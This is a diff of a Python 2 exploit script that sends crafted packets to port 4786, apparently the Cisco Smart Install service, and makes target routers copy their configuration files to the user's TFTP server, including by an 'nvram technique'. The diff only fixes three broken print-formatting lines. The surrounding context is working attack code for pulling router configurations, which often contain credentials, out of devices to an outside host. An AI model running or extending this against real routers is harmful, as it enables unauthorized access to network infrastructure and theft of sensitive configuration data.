@@ -13,7 +13,7 @@ conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn_with_host.settimeout(5)
 conn_with_host.connect((ip, 4786))
 print "[*] Testing with mode set to 1"
-print "[*] Sending data to target: %s" sTcp
+print "[*] Sending data to target: %s" % sTcp
 conn_with_host.send(data)
 resp = '0' * 7 + '4' + '0' * 8 + '0' * 7 + '3' + '0' * 7 + '8' + '0' * 7 + '1' + '0' * 8
 while True:
@@ -45,7 +45,7 @@ sTcp = sTcp.decode('hex')
 conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn_with_host.settimeout(5)
 conn_with_host.connect((ip, 4786))
-print "[*] Sending data to target: %s" sTcp
+print "[*] Sending data to target: %s" % sTcp
 print "[*] Check your TFTP server for the downloaded config file"
 
 print "[*] Trying to get router-config file with nvram technique"
@@ -57,6 +57,6 @@ sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
 sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
 sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
 sTcp = sTcp.decode('hex')
-print "[*] Sending data to target: %s" sTcp
+print "[*] Sending data to target: %s" % sTcp
 print "[*] Check your TFTP server for the downloaded config file"
 
